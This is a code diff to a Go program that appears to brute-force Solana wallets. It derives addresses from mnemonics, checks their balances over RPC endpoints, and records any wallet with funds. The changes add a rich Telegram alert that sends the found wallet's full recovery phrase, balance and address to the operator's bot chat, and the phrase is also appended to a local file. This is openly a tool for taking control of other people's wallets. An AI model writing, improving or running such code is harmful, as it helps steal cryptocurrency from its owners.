@@ -96,22 +96,34 @@ var (
 // ---------------- Telegram ----------------
 func sendTelegramNotification(token, chatID, msg string) {
 	if token == "" || chatID == "" {
+		log.Println("[⚠️ Telegram Warning] Cannot send alert: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing.")
 		return
 	}
 	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)
 	payload := map[string]string{
-		"chat_id": chatID,
-		"text":    msg,
+		"chat_id":    chatID,
+		"text":       msg,
+		"parse_mode": "HTML",
 	}
 	data, err := json.Marshal(payload)
 	if err != nil {
+		log.Printf("[Telegram Error] Marshal error: %v\n", err)
 		return
 	}
 
-	client := &http.Client{Timeout: 8 * time.Second}
+	client := &http.Client{Timeout: 10 * time.Second}
 	resp, err := client.Post(url, "application/json", bytes.NewBuffer(data))
-	if err == nil {
-		defer resp.Body.Close()
+	if err != nil {
+		log.Printf("[Telegram Error] Failed to send alert: %v\n", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		body, _ := io.ReadAll(resp.Body)
+		log.Printf("[Telegram Error] Telegram API returned HTTP %d: %s\n", resp.StatusCode, string(body))
+	} else {
+		log.Printf("[🎉 Telegram Alert Sent] Successfully sent found wallet alert to Chat ID: %s\n", chatID)
 	}
 }
 
@@ -471,6 +483,12 @@ func main() {
 		}
 	}()
 
+	if cfg.TelegramBotToken != "" && cfg.TelegramChatID != "" {
+		log.Printf("[📱 Telegram Alerts] Active for Chat ID: %s\n", cfg.TelegramChatID)
+	} else {
+		log.Println("[⚠️ Telegram Alerts] Inactive (TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set in environment)")
+	}
+
 	log.Printf("Worker loop started with %d RPC endpoints (Concurrency: %d, Delay: %dms)\n",
 		len(rpcMgr.endpoints), cfg.Concurrency, cfg.DelayMs)
 
@@ -511,16 +529,28 @@ func main() {
 
 				if bal > 0 {
 					atomic.AddUint64(&foundCount, 1)
-					msg := fmt.Sprintf("🎉 Balance Found!\nAddress: %s\nBalance: %.9f SOL\nMnemonic: %s", addr, bal, mnemonic)
-					log.Println(msg)
+
+					// Rich HTML formatted message for Telegram
+					telegramMsg := fmt.Sprintf(
+						"🎉 <b>SOLANA WALLET FOUND!</b>\n\n"+
+							"💰 <b>Balance:</b> <code>%.9f SOL</code>\n"+
+							"📍 <b>Address:</b> <code>%s</code>\n\n"+
+							"🔑 <b>Mnemonic:</b>\n<code>%s</code>\n\n"+
+							"⏰ <b>Timestamp:</b> %s",
+						bal, addr, mnemonic, time.Now().UTC().Format("2006-01-02 15:04:05 UTC"),
+					)
+
+					log.Printf("🎉 [BALANCE FOUND] Address: %s | Balance: %.9f SOL\n", addr, bal)
 
 					f, err := os.OpenFile("nonzero.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 					if err == nil {
-						_, _ = f.WriteString(msg + "\n\n")
+						rawLog := fmt.Sprintf("Mnemonic: %s\nAddress: %s\nBalance: %.9f SOL\nTime: %s\n\n",
+							mnemonic, addr, bal, time.Now().UTC().Format(time.RFC3339))
+						_, _ = f.WriteString(rawLog)
 						f.Close()
 					}
 
-					sendTelegramNotification(cfg.TelegramBotToken, cfg.TelegramChatID, msg)
+					sendTelegramNotification(cfg.TelegramBotToken, cfg.TelegramChatID, telegramMsg)
 				}
 			}()
 		}
